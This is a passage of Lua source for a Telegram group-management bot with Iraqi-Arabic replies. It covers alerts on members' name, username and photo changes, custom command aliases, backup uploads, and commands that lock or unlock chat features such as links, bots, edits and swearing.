tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
if data.id_ ~= bot_id then
local RiNdAChengName = database:get(bot_id.."RiNdA:Cheng:Name"..data.id_)
if not data.first_name_ then 
if RiNdAChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..RiNdAChengName..']')
database:del(bot_id.."RiNdA:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if RiNdAChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
"ليش غيرته اسمك بس لا خانوك/ج",
"هذا الحلو غير اسمه 😉",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."RiNdA:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
end
if text == "تفعيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '⊀︰ تم تفعيل تنبيه المعرف')
database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه المعرف" and Constructor(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '⊀︰ تم تعطيل تنبيه المعرف')
database:set(bot_id.."Ttn:Userr:stats"..msg.chat_id_,"close")
end
if text and database:get(bot_id.."Ttn:Userr:stats"..msg.chat_id_) == "open" then  
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
if data.id_ ~= bot_id then
local RiNdAChengUserName = database:get(bot_id.."RiNdA:Cheng:UserName"..data.id_)
if not data.username_ then 
if RiNdAChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..RiNdAChengUserName..']')
database:del(bot_id.."RiNdA:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if RiNdAChengUserName ~= data.username_ then 
local Text = {
'شكو غيرت معرفك شنو نشروك بقنوات فضايح',
"هاها شو غيرت معرفك بس لا هددتك/ج الحب",
"شسالفه شو غيرت معرفك 😐🌝",
"غير معرفه خمطو بساع بساع \n هاذه معرفه : @"..data.username_.."",
'ها عار مو جان معرفك \n شكو غيرته ل @'..data.username_..' ',
'ها يول شو مغير معرفك بيش مشتري يول', 
"منور معرف جديد :  "..data.username_.."",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."RiNdA:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
end
if text == "تفعيل تنبيه الصور" and Manager(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '⊀︰ تم تفعيل تنبيه الصور')
database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الصور" and Manager(msg) and database:get(bot_id.."AL:AddS0FI:stats") == "✔" then
send(msg.chat_id_, msg.id_, '⊀︰ تم تعطيل تنبيه الصور')
database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"close")
end
if text and database:get(bot_id.."Ttn:Ph:stats"..msg.chat_id_) == "open" then  
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
if data.id_ ~= bot_id then 
local RiNdAChengPhoto = database:get(bot_id.."RiNdA:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if RiNdAChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد")
database:del(bot_id.."RiNdA:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if RiNdAChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
  "شكو غيرت صورتك يلصاك",
  "منور طالع حلو ع صوره جديده",
  "ها يول شو غيرت صورتك😍😂",
  "شكو غيرت صورتك شنو قطيت وحده جديده 😹😹🌚",
  "شو غيرت صورتك شنو تعاركت ويه الحب ؟😹🌞",
  "شكو غيرت الصوره شسالفه ؟؟ 🤔🌞",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."RiNdA:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
end
if text == 'السورس' or text == 'سورس' or text == 'ياسورس' or text == 'يا سورس' then       
Text = "𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙍𝙞𝙉𝙙𝘼"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '<𝙎𝙤𝙪𝙍𝙘𝙀🕸️𝙍𝙞𝙉𝙙𝘼> .',url="https://t.me/SourcE_RiNdA"}},{{text = '𝗗𝗲𝗩 𝗪𝗮𝗘𝗹 .',url="https://t.me/Wyyyyy"},{text = '𝗗𝗲𝗩 𝗛𝗮𝗦𝗼 .',url="https://t.me/Biiiii"}},{{text = '𝗥𝗶𝗡𝗱𝗔 𝗰𝗛𝗮𝗻𝗻𝗹 .',url="https://t.me/ebbxx"}},{{text = '𝗥𝗶𝗻𝗱𝗔 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 .',url="https://t.me/joinchat/B-Qo-OmD86s2MzZi"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SourcE_RiNdA&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
if text == 'ارفع نسخه الاحتياطيه' and Devmode(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile_Bot(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'ارفع نسخه للبوت' and Devmode(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
GetFile_Bot(msg)
end
if text == 'الاوامر المضافه' and Constructor(msg) then
local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_..'')
t = " ⊀︰ قائمه الاوامر المضافه  \n●━━━━𝐑𝐀━━━━●\n"
for k,v in pairs(list) do
Cmds = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
print(Cmds)
if Cmds then 
t = t..""..k.."↫ ("..v..") ↶ {"..Cmds.."}\n"
else
t = t..""..k.."↫ ("..v..") \n"
end
end
if #list == 0 then
t = "*⊀︰ ماڪو اوامـࢪ مضافه يࢪوحي..*"
end
send(msg.chat_id_, msg.id_,'['..t..']')
end
if text == 'حذف الاوامر المضافه' or text == 'مسح الاوامر المضافه' then
if Constructor(msg) then 
local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_)
for k,v in pairs(list) do
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
database:del(bot_id..'List:Cmd:Group:New'..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,'* ⊀︰ تم ازالة جميع الاوامر المضافه*')  
end
end
if text == 'اضف امر' and Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
send(msg.chat_id_, msg.id_,'* ⊀︰ ارسل الامر القديم*')  
return false
end
if text == 'حذف امر' or text == 'مسح امر' then 
if Constructor(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ⊀︰ بـࢪو ماتڪدࢪ تستعمل البـوت \n  ⊀︰ لازم تـشتࢪڪ بقناه سوࢪس يࢪوحي \n  ⊀︰ اشـتࢪڪ هنا..🔫 ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
send(msg.chat_id_, msg.id_,'* ⊀︰ ارسل الامر الذي قمت بخليه بدلا عن القديم*')  
return false
end
end
if text and database:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
database:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,'* ⊀︰ ارسل الامر الجديد*')  
database:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_)
database:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_,'true1') 
return false
end
if text and database:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_) == 'true1' then
local NewCmd = database:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text,NewCmd)
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,'* ⊀︰ تم حفظ الامر*')  
database:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_)
return false
end
if text == "ترتيب الاوامر" and Constructor(msg) then
 database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
 database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"ا")
  database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":بنعال","حظر")
 database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"بنعال")
   database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":دي","طرد")
 database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"دي")
  database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":اش","كتم")
 database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"اش")
  database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":تق","تقيد")
 database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"تق")
 database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":م","ارفع مميز")
 database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"م")
 database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","ارفع ادمن")
 database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"اد")
 database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","ارفع مدير")
 database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"مد")
 database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":من","ارفع منشئ")
 database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"من")
 database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","ارفع منشئ اساسي")
 database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"اس")
 database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
 database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
 database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
 database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
 send(msg.chat_id_, msg.id_,"*⊀︰ تم ترتيب الاوامر بالشكل التالي ~*\n⊀︰ . ايدي - ا . \n⊀︰ . طرد - دي . \n⊀︰ . حظر - بنعال . \n⊀︰ . كتم - اش . \n⊀︰ . مميز - م .\n⊀︰ . ادمن - اد .\n⊀︰ . مدير - مد . \n⊀︰ . منشى - من . \n⊀︰ . المنشئ الاساسي - اس . \n⊀︰ . تعطيل الايدي بالصوره - تعط .\n⊀︰ . تفعيل الايدي بالصوره - تفع .")
 end
--------------------------------------------------------------------------------------------------------------
if text == 'سد الدردشه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id.."lock:text"..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الدردشه *')
end,nil)   
elseif text == 'سد الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:AddMempar"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n*⊀︰ .| سـد ↶ اضافة *')
end,nil)   
elseif text == 'سد الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Join"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ دخول *')
end,nil)   
elseif text == 'سد البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ البوتات *')
end,nil)   
elseif text == 'سد البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ البوتات بالطرد *')
end,nil)   
elseif text == 'سد الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
database:set(bot_id..'lock:tagservr'..msg.chat_id_,true)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الاشعارات *')
end,nil)   
elseif text == 'سد التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id.."lockpin"..msg.chat_id_, true) 
database:sadd(bot_id..'lock:pin',msg.chat_id_) 
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,data.pinned_message_id_)  end,nil)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ التثبيت *')
end,nil)   
elseif text == 'سد التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock:edit'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ تعديل *')
end,nil)   
elseif text == 'سد السب' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ السب *')
end,nil)  
elseif text == 'سد الفارسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الفارسيه *')
end,nil)   
elseif text == 'سد الانكليزيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Engilsh'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الانكليزيه *')
end,nil)
elseif text == 'سد الانلاين' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id.."lock:inline"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الانلاين *')
end,nil)
elseif text == 'سد تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock_edit_med'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ تعديل *')
end,nil)    
elseif text == 'سد الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id..'lock:tagservrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lsock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ جميع الاوامر *')
end,nil)   
end
if text == 'سد الاباحي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Lock:Sexy"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ سـد ↶ الاباحي *')
end,nil)   
elseif text == 'افتح الاباحي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Lock:Sexy"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الاباحي *')
end,nil)   
end
if text == 'افتح الانلاين' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:inline"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الانلاين *')
end,nil)
elseif text == 'افتح الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:AddMempar"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > اضافة *')
end,nil)   
elseif text == 'افتح الدردشه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id.."lock:text"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > الدردشه *')
end,nil)   
elseif text == 'افتح الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Join"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ نفـتحت > دخول *')
end,nil)   
elseif text == 'افتح البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ تـم فـتح البوتات *')
end,nil)   
elseif text == 'افتح البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ تـم فـتح البوتات بالطرد *')
end,nil)   
elseif text == 'افتح الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
database:del(bot_id..'lock:tagservr'..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ تـم فـتح الاشعارات *')
end,nil)   
elseif text == 'افتح التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id.."lockpin"..msg.chat_id_)  
database:srem(bot_id..'lock:pin',msg.chat_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ تـم فـتح التثبيت *')
end,nil)   
elseif text == 'افتح التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock:edit'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ تـم فـتح تعديل *')
end,nil)   
elseif text == 'افتح السب' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fshar'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ تـم فـتح السب *')
end,nil)   
elseif text == 'افتح الفارسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ تـم فـتح الفارسيه *')
end,nil)   
elseif text == 'افتح الانكليزيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Engilsh'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ تـم فـتح الانكليزيه *')
end,nil)
elseif text == 'افتح تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock_edit_med'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ تـم فـتح تعديل *')
end,nil)    
elseif text == 'افتح الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id..'lock:tagservrbot'..msg.chat_id_)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..lock..msg.chat_id_)    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' *⊀︰ الـضلـ؏  ↷ * ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'SourcE_RiNdA')..') \n *⊀︰ تـم فـتح جميع الاوامر *')
end,nil)   
end
if text == 'سد الروابط' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Link"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
